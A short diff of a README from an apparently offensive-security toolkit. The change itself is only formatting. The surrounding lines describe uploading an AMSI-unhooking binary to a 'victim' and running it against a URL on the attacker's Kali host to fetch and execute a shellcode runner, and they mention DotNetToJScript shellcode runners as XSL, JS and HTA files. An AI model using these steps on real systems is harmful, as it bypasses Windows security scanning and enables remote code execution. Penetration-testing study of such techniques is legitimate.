@@ -61,7 +61,8 @@ To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com
 1. Upload unhook_amsi.exe and MinHook.NET.dll to victim. (Files located under payloads/AMSI/)
 2. unhook_amsi.exe http://<KALI>/shellcode_runner.exe
 
-**[+] Executing .XSL, .JS, .HTA [+]**
+---
+ **[+] Executing .XSL, .JS, .HTA [+]**
 
 Under directory payloads/DotNetToJScript/, you find three shellcode ruuners that generated with DotNetToJScript (https://github.com/tyranid/DotNetToJScript). 
 
